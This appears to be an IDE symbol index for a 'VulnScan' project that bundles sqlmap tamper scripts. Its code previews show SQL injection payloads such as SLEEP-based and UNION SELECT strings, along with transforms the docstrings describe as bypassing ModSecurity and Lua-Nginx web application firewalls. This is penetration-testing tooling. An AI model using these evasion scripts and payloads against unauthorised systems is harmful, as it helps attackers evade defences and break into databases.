        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    HTML encode in hexadecimal (using code points) all characters (e.g. ' -> &#x31;)\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    '&#x31;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x53;&#x4c;&#x45;&#x45;&#x50;&#x28;&#x35;&#x29;&#x23;'\n    \"\"\"\n    retVal = payload\n    if payload:",
        "detail": "VulnScan.modules.sqlmap.tamper.hexentities",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.hexentities",
        "description": "VulnScan.modules.sqlmap.tamper.hexentities",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    HTML encode in hexadecimal (using code points) all characters (e.g. ' -> &#x31;)\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    '&#x31;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x53;&#x4c;&#x45;&#x45;&#x50;&#x28;&#x35;&#x29;&#x23;'\n    \"\"\"\n    retVal = payload\n    if payload:\n        retVal = \"\"\n        i = 0",
        "detail": "VulnScan.modules.sqlmap.tamper.hexentities",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.hexentities",
        "description": "VulnScan.modules.sqlmap.tamper.hexentities",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    HTML encode in hexadecimal (using code points) all characters (e.g. ' -> &#x31;)\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    '&#x31;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x53;&#x4c;&#x45;&#x45;&#x50;&#x28;&#x35;&#x29;&#x23;'\n    \"\"\"\n    retVal = payload",
        "detail": "VulnScan.modules.sqlmap.tamper.hexentities",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.htmlencode",
        "description": "VulnScan.modules.sqlmap.tamper.htmlencode",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;)\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;'\n    >>> tamper(\"1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;\")\n    '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.tamper.htmlencode",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.htmlencode",
        "description": "VulnScan.modules.sqlmap.tamper.htmlencode",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;)\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;'\n    >>> tamper(\"1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;\")\n    '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;'\n    \"\"\"\n    if payload:\n        payload = re.sub(r\"&#(\\d+);\", lambda match: chr(int(match.group(1))), payload)      # NOTE: https://github.com/sqlmapproject/sqlmap/issues/5203",
        "detail": "VulnScan.modules.sqlmap.tamper.htmlencode",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.htmlencode",
        "description": "VulnScan.modules.sqlmap.tamper.htmlencode",
        "peekOfCode": "__priority__ = PRIORITY.LOW\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;)\n    >>> tamper(\"1' AND SLEEP(5)#\")\n    '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;'\n    >>> tamper(\"1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;\")\n    '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;'",
        "detail": "VulnScan.modules.sqlmap.tamper.htmlencode",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.ifnull2casewhenisnull",
        "description": "VulnScan.modules.sqlmap.tamper.ifnull2casewhenisnull",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart\n    Requirement:\n        * MySQL\n        * SQLite (possibly)\n        * SAP MaxDB (possibly)\n    Tested against:",
        "detail": "VulnScan.modules.sqlmap.tamper.ifnull2casewhenisnull",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.ifnull2casewhenisnull",
        "description": "VulnScan.modules.sqlmap.tamper.ifnull2casewhenisnull",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart\n    Requirement:\n        * MySQL\n        * SQLite (possibly)\n        * SAP MaxDB (possibly)\n    Tested against:\n        * MySQL 5.0 and 5.5\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.ifnull2casewhenisnull",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.ifnull2casewhenisnull",
        "description": "VulnScan.modules.sqlmap.tamper.ifnull2casewhenisnull",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart\n    Requirement:\n        * MySQL\n        * SQLite (possibly)\n        * SAP MaxDB (possibly)",
        "detail": "VulnScan.modules.sqlmap.tamper.ifnull2casewhenisnull",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.ifnull2ifisnull",
        "description": "VulnScan.modules.sqlmap.tamper.ifnull2ifisnull",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' counterpart\n    Requirement:\n        * MySQL\n        * SQLite (possibly)\n        * SAP MaxDB (possibly)\n    Tested against:",
        "detail": "VulnScan.modules.sqlmap.tamper.ifnull2ifisnull",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.ifnull2ifisnull",
        "description": "VulnScan.modules.sqlmap.tamper.ifnull2ifisnull",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' counterpart\n    Requirement:\n        * MySQL\n        * SQLite (possibly)\n        * SAP MaxDB (possibly)\n    Tested against:\n        * MySQL 5.0 and 5.5\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.ifnull2ifisnull",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.ifnull2ifisnull",
        "description": "VulnScan.modules.sqlmap.tamper.ifnull2ifisnull",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' counterpart\n    Requirement:\n        * MySQL\n        * SQLite (possibly)\n        * SAP MaxDB (possibly)",
        "detail": "VulnScan.modules.sqlmap.tamper.ifnull2ifisnull",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.informationschemacomment",
        "description": "VulnScan.modules.sqlmap.tamper.informationschemacomment",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Add an inline comment (/**/) to the end of all occurrences of (MySQL) \"information_schema\" identifier\n    >>> tamper('SELECT table_name FROM INFORMATION_SCHEMA.TABLES')\n    'SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES'\n    \"\"\"\n    retVal = payload\n    if payload:\n        retVal = re.sub(r\"(?i)(information_schema)\\.\", r\"\\g<1>/**/.\", payload)\n    return retVal",
        "detail": "VulnScan.modules.sqlmap.tamper.informationschemacomment",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.informationschemacomment",
        "description": "VulnScan.modules.sqlmap.tamper.informationschemacomment",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Add an inline comment (/**/) to the end of all occurrences of (MySQL) \"information_schema\" identifier\n    >>> tamper('SELECT table_name FROM INFORMATION_SCHEMA.TABLES')\n    'SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES'\n    \"\"\"\n    retVal = payload\n    if payload:\n        retVal = re.sub(r\"(?i)(information_schema)\\.\", r\"\\g<1>/**/.\", payload)",
        "detail": "VulnScan.modules.sqlmap.tamper.informationschemacomment",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.least",
        "description": "VulnScan.modules.sqlmap.tamper.least",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces greater than operator ('>') with 'LEAST' counterpart\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.least",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.least",
        "description": "VulnScan.modules.sqlmap.tamper.least",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces greater than operator ('>') with 'LEAST' counterpart\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:\n        * Useful to bypass weak and bespoke web application firewalls that\n          filter the greater than character",
        "detail": "VulnScan.modules.sqlmap.tamper.least",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.least",
        "description": "VulnScan.modules.sqlmap.tamper.least",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces greater than operator ('>') with 'LEAST' counterpart\n    Tested against:\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0",
        "detail": "VulnScan.modules.sqlmap.tamper.least",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.lowercase",
        "description": "VulnScan.modules.sqlmap.tamper.lowercase",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each keyword character with lower case value (e.g. SELECT -> select)\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0",
        "detail": "VulnScan.modules.sqlmap.tamper.lowercase",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.lowercase",
        "description": "VulnScan.modules.sqlmap.tamper.lowercase",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each keyword character with lower case value (e.g. SELECT -> select)\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g\n        * PostgreSQL 8.3, 8.4, 9.0\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls",
        "detail": "VulnScan.modules.sqlmap.tamper.lowercase",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.lowercase",
        "description": "VulnScan.modules.sqlmap.tamper.lowercase",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces each keyword character with lower case value (e.g. SELECT -> select)\n    Tested against:\n        * Microsoft SQL Server 2005\n        * MySQL 4, 5.0 and 5.5\n        * Oracle 10g",
        "detail": "VulnScan.modules.sqlmap.tamper.lowercase",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.luanginx",
        "description": "VulnScan.modules.sqlmap.tamper.luanginx",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    LUA-Nginx WAFs Bypass (e.g. Cloudflare)\n    Reference:\n        * https://opendatasecurity.io/cloudflare-vulnerability-allows-waf-be-disabled/\n    Notes:\n        * Lua-Nginx WAFs do not support processing of more than 100 parameters\n    >>> random.seed(0); hints={}; payload = tamper(\"1 AND 2>1\", hints=hints); \"%s&%s\" % (hints[HINT.PREPEND], payload)\n    '34=&Xe=&90=&Ni=&rW=&lc=&te=&T4=&zO=&NY=&B4=&hM=&X2=&pU=&D8=&hm=&p0=&7y=&18=&RK=&Xi=&5M=&vM=&hO=&bg=&5c=&b8=&dE=&7I=&5I=&90=&R2=&BK=&bY=&p4=&lu=&po=&Vq=&bY=&3c=&ps=&Xu=&lK=&3Q=&7s=&pq=&1E=&rM=&FG=&vG=&Xy=&tQ=&lm=&rO=&pO=&rO=&1M=&vy=&La=&xW=&f8=&du=&94=&vE=&9q=&bE=&lQ=&JS=&NQ=&fE=&RO=&FI=&zm=&5A=&lE=&DK=&x8=&RQ=&Xw=&LY=&5S=&zi=&Js=&la=&3I=&r8=&re=&Xe=&5A=&3w=&vs=&zQ=&1Q=&HW=&Bw=&Xk=&LU=&Lk=&1E=&Nw=&pm=&ns=&zO=&xq=&7k=&v4=&F6=&Pi=&vo=&zY=&vk=&3w=&tU=&nW=&TG=&NM=&9U=&p4=&9A=&T8=&Xu=&xa=&Jk=&nq=&La=&lo=&zW=&xS=&v0=&Z4=&vi=&Pu=&jK=&DE=&72=&fU=&DW=&1g=&RU=&Hi=&li=&R8=&dC=&nI=&9A=&tq=&1w=&7u=&rg=&pa=&7c=&zk=&rO=&xy=&ZA=&1K=&ha=&tE=&RC=&3m=&r2=&Vc=&B6=&9A=&Pk=&Pi=&zy=&lI=&pu=&re=&vS=&zk=&RE=&xS=&Fs=&x8=&Fe=&rk=&Fi=&Tm=&fA=&Zu=&DS=&No=&lm=&lu=&li=&jC=&Do=&Tw=&xo=&zQ=&nO=&ng=&nC=&PS=&fU=&Lc=&Za=&Ta=&1y=&lw=&pA=&ZW=&nw=&pM=&pa=&Rk=&lE=&5c=&T4=&Vs=&7W=&Jm=&xG=&nC=&Js=&xM=&Rg=&zC=&Dq=&VA=&Vy=&9o=&7o=&Fk=&Ta=&Fq=&9y=&vq=&rW=&X4=&1W=&hI=&nA=&hs=&He=&No=&vy=&9C=&ZU=&t6=&1U=&1Q=&Do=&bk=&7G=&nA=&VE=&F0=&BO=&l2=&BO=&7o=&zq=&B4=&fA=&lI=&Xy=&Ji=&lk=&7M=&JG=&Be=&ts=&36=&tW=&fG=&T4=&vM=&hG=&tO=&VO=&9m=&Rm=&LA=&5K=&FY=&HW=&7Q=&t0=&3I=&Du=&Xc=&BS=&N0=&x4=&fq=&jI=&Ze=&TQ=&5i=&T2=&FQ=&VI=&Te=&Hq=&fw=&LI=&Xq=&LC=&B0=&h6=&TY=&HG=&Hw=&dK=&ru=&3k=&JQ=&5g=&9s=&HQ=&vY=&1S=&ta=&bq=&1u=&9i=&DM=&DA=&TG=&vQ=&Nu=&RK=&da=&56=&nm=&vE=&Fg=&jY=&t0=&DG=&9o=&PE=&da=&D4=&VE=&po=&nm=&lW=&X0=&BY=&NK=&pY=&5Q=&jw=&r0=&FM=&lU=&da=&ls=&Lg=&D8=&B8=&FW=&3M=&zy=&ho=&Dc=&HW=&7E=&bM=&Re=&jk=&Xe=&JC=&vs=&Ny=&D4=&fA=&DM=&1o=&9w=&3C=&Rw=&Vc=&Ro=&PK=&rw=&Re=&54=&xK=&VK=&1O=&1U=&vg=&Ls=&xq=&NA=&zU=&di=&BS=&pK=&bW=&Vq=&BC=&l6=&34=&PE=&JG=&TA=&NU=&hi=&T0=&Rs=&fw=&FQ=&NQ=&Dq=&Dm=&1w=&PC=&j2=&r6=&re=&t2=&Ry=&h2=&9m=&nw=&X4=&vI=&rY=&1K=&7m=&7g=&J8=&Pm=&RO=&7A=&fO=&1w=&1g=&7U=&7Y=&hQ=&FC=&vu=&Lw=&5I=&t0=&Na=&vk=&Te=&5S=&ZM=&Xs=&Vg=&tE=&J2=&Ts=&Dm=&Ry=&FC=&7i=&h8=&3y=&zk=&5G=&NC=&Pq=&ds=&zK=&d8=&zU=&1a=&d8=&Js=&nk=&TQ=&tC=&n8=&Hc=&Ru=&H0=&Bo=&XE=&Jm=&xK=&r2=&Fu=&FO=&NO=&7g=&PC=&Bq=&3O=&FQ=&1o=&5G=&zS=&Ps=&j0=&b0=&RM=&DQ=&RQ=&zY=&nk=&1 AND 2>1'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.tamper.luanginx",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.luanginx",
        "description": "VulnScan.modules.sqlmap.tamper.luanginx",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef tamper(payload, **kwargs):\n    \"\"\"\n    LUA-Nginx WAFs Bypass (e.g. Cloudflare)\n    Reference:\n        * https://opendatasecurity.io/cloudflare-vulnerability-allows-waf-be-disabled/\n    Notes:\n        * Lua-Nginx WAFs do not support processing of more than 100 parameters\n    >>> random.seed(0); hints={}; payload = tamper(\"1 AND 2>1\", hints=hints); \"%s&%s\" % (hints[HINT.PREPEND], payload)\n    '34=&Xe=&90=&Ni=&rW=&lc=&te=&T4=&zO=&NY=&B4=&hM=&X2=&pU=&D8=&hm=&p0=&7y=&18=&RK=&Xi=&5M=&vM=&hO=&bg=&5c=&b8=&dE=&7I=&5I=&90=&R2=&BK=&bY=&p4=&lu=&po=&Vq=&bY=&3c=&ps=&Xu=&lK=&3Q=&7s=&pq=&1E=&rM=&FG=&vG=&Xy=&tQ=&lm=&rO=&pO=&rO=&1M=&vy=&La=&xW=&f8=&du=&94=&vE=&9q=&bE=&lQ=&JS=&NQ=&fE=&RO=&FI=&zm=&5A=&lE=&DK=&x8=&RQ=&Xw=&LY=&5S=&zi=&Js=&la=&3I=&r8=&re=&Xe=&5A=&3w=&vs=&zQ=&1Q=&HW=&Bw=&Xk=&LU=&Lk=&1E=&Nw=&pm=&ns=&zO=&xq=&7k=&v4=&F6=&Pi=&vo=&zY=&vk=&3w=&tU=&nW=&TG=&NM=&9U=&p4=&9A=&T8=&Xu=&xa=&Jk=&nq=&La=&lo=&zW=&xS=&v0=&Z4=&vi=&Pu=&jK=&DE=&72=&fU=&DW=&1g=&RU=&Hi=&li=&R8=&dC=&nI=&9A=&tq=&1w=&7u=&rg=&pa=&7c=&zk=&rO=&xy=&ZA=&1K=&ha=&tE=&RC=&3m=&r2=&Vc=&B6=&9A=&Pk=&Pi=&zy=&lI=&pu=&re=&vS=&zk=&RE=&xS=&Fs=&x8=&Fe=&rk=&Fi=&Tm=&fA=&Zu=&DS=&No=&lm=&lu=&li=&jC=&Do=&Tw=&xo=&zQ=&nO=&ng=&nC=&PS=&fU=&Lc=&Za=&Ta=&1y=&lw=&pA=&ZW=&nw=&pM=&pa=&Rk=&lE=&5c=&T4=&Vs=&7W=&Jm=&xG=&nC=&Js=&xM=&Rg=&zC=&Dq=&VA=&Vy=&9o=&7o=&Fk=&Ta=&Fq=&9y=&vq=&rW=&X4=&1W=&hI=&nA=&hs=&He=&No=&vy=&9C=&ZU=&t6=&1U=&1Q=&Do=&bk=&7G=&nA=&VE=&F0=&BO=&l2=&BO=&7o=&zq=&B4=&fA=&lI=&Xy=&Ji=&lk=&7M=&JG=&Be=&ts=&36=&tW=&fG=&T4=&vM=&hG=&tO=&VO=&9m=&Rm=&LA=&5K=&FY=&HW=&7Q=&t0=&3I=&Du=&Xc=&BS=&N0=&x4=&fq=&jI=&Ze=&TQ=&5i=&T2=&FQ=&VI=&Te=&Hq=&fw=&LI=&Xq=&LC=&B0=&h6=&TY=&HG=&Hw=&dK=&ru=&3k=&JQ=&5g=&9s=&HQ=&vY=&1S=&ta=&bq=&1u=&9i=&DM=&DA=&TG=&vQ=&Nu=&RK=&da=&56=&nm=&vE=&Fg=&jY=&t0=&DG=&9o=&PE=&da=&D4=&VE=&po=&nm=&lW=&X0=&BY=&NK=&pY=&5Q=&jw=&r0=&FM=&lU=&da=&ls=&Lg=&D8=&B8=&FW=&3M=&zy=&ho=&Dc=&HW=&7E=&bM=&Re=&jk=&Xe=&JC=&vs=&Ny=&D4=&fA=&DM=&1o=&9w=&3C=&Rw=&Vc=&Ro=&PK=&rw=&Re=&54=&xK=&VK=&1O=&1U=&vg=&Ls=&xq=&NA=&zU=&di=&BS=&pK=&bW=&Vq=&BC=&l6=&34=&PE=&JG=&TA=&NU=&hi=&T0=&Rs=&fw=&FQ=&NQ=&Dq=&Dm=&1w=&PC=&j2=&r6=&re=&t2=&Ry=&h2=&9m=&nw=&X4=&vI=&rY=&1K=&7m=&7g=&J8=&Pm=&RO=&7A=&fO=&1w=&1g=&7U=&7Y=&hQ=&FC=&vu=&Lw=&5I=&t0=&Na=&vk=&Te=&5S=&ZM=&Xs=&Vg=&tE=&J2=&Ts=&Dm=&Ry=&FC=&7i=&h8=&3y=&zk=&5G=&NC=&Pq=&ds=&zK=&d8=&zU=&1a=&d8=&Js=&nk=&TQ=&tC=&n8=&Hc=&Ru=&H0=&Bo=&XE=&Jm=&xK=&r2=&Fu=&FO=&NO=&7g=&PC=&Bq=&3O=&FQ=&1o=&5G=&zS=&Ps=&j0=&b0=&RM=&DQ=&RQ=&zY=&nk=&1 AND 2>1'",
        "detail": "VulnScan.modules.sqlmap.tamper.luanginx",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.misunion",
        "description": "VulnScan.modules.sqlmap.tamper.misunion",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of UNION with -.1UNION\n    Requirement:\n        * MySQL\n    Notes:\n        * Reference: https://raw.githubusercontent.com/y0unge/Notes/master/SQL%20Injection%20WAF%20Bypassing%20shortcut.pdf\n    >>> tamper('1 UNION ALL SELECT')",
        "detail": "VulnScan.modules.sqlmap.tamper.misunion",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.misunion",
        "description": "VulnScan.modules.sqlmap.tamper.misunion",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of UNION with -.1UNION\n    Requirement:\n        * MySQL\n    Notes:\n        * Reference: https://raw.githubusercontent.com/y0unge/Notes/master/SQL%20Injection%20WAF%20Bypassing%20shortcut.pdf\n    >>> tamper('1 UNION ALL SELECT')\n    '1-.1UNION ALL SELECT'\n    >>> tamper('1\" UNION ALL SELECT')",
        "detail": "VulnScan.modules.sqlmap.tamper.misunion",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.misunion",
        "description": "VulnScan.modules.sqlmap.tamper.misunion",
        "peekOfCode": "__priority__ = PRIORITY.HIGHEST\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Replaces instances of UNION with -.1UNION\n    Requirement:\n        * MySQL\n    Notes:\n        * Reference: https://raw.githubusercontent.com/y0unge/Notes/master/SQL%20Injection%20WAF%20Bypassing%20shortcut.pdf",
        "detail": "VulnScan.modules.sqlmap.tamper.misunion",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.modsecurityversioned",
        "description": "VulnScan.modules.sqlmap.tamper.modsecurityversioned",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Embraces complete query with (MySQL) versioned comment\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.modsecurityversioned",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.modsecurityversioned",
        "description": "VulnScan.modules.sqlmap.tamper.modsecurityversioned",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Embraces complete query with (MySQL) versioned comment\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0\n    Notes:\n        * Useful to bypass ModSecurity WAF\n    >>> import random",
        "detail": "VulnScan.modules.sqlmap.tamper.modsecurityversioned",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.modsecurityversioned",
        "description": "VulnScan.modules.sqlmap.tamper.modsecurityversioned",
        "peekOfCode": "__priority__ = PRIORITY.HIGHER\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Embraces complete query with (MySQL) versioned comment\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0",
        "detail": "VulnScan.modules.sqlmap.tamper.modsecurityversioned",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.modsecurityzeroversioned",
        "description": "VulnScan.modules.sqlmap.tamper.modsecurityzeroversioned",
        "peekOfCode": "def dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Embraces complete query with (MySQL) zero-versioned comment\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0\n    Notes:",
        "detail": "VulnScan.modules.sqlmap.tamper.modsecurityzeroversioned",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.modsecurityzeroversioned",
        "description": "VulnScan.modules.sqlmap.tamper.modsecurityzeroversioned",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Embraces complete query with (MySQL) zero-versioned comment\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0\n    Notes:\n        * Useful to bypass ModSecurity WAF\n    >>> tamper('1 AND 2>1--')",
        "detail": "VulnScan.modules.sqlmap.tamper.modsecurityzeroversioned",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.modsecurityzeroversioned",
        "description": "VulnScan.modules.sqlmap.tamper.modsecurityzeroversioned",
        "peekOfCode": "__priority__ = PRIORITY.HIGHER\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Embraces complete query with (MySQL) zero-versioned comment\n    Requirement:\n        * MySQL\n    Tested against:\n        * MySQL 5.0",
        "detail": "VulnScan.modules.sqlmap.tamper.modsecurityzeroversioned",
        "documentation": {}
    },
    {
        "label": "dependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.multiplespaces",
        "description": "VulnScan.modules.sqlmap.tamper.multiplespaces",
        "peekOfCode": "def dependencies():\n    pass\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Adds multiple spaces (' ') around SQL keywords\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that has poorly written permissive regular expressions\n    Reference: https://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt\n    >>> random.seed(0)",
        "detail": "VulnScan.modules.sqlmap.tamper.multiplespaces",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.multiplespaces",
        "description": "VulnScan.modules.sqlmap.tamper.multiplespaces",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Adds multiple spaces (' ') around SQL keywords\n    Notes:\n        * Useful to bypass very weak and bespoke web application firewalls\n          that has poorly written permissive regular expressions\n    Reference: https://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt\n    >>> random.seed(0)\n    >>> tamper('1 UNION SELECT foobar')\n    '1     UNION     SELECT     foobar'",
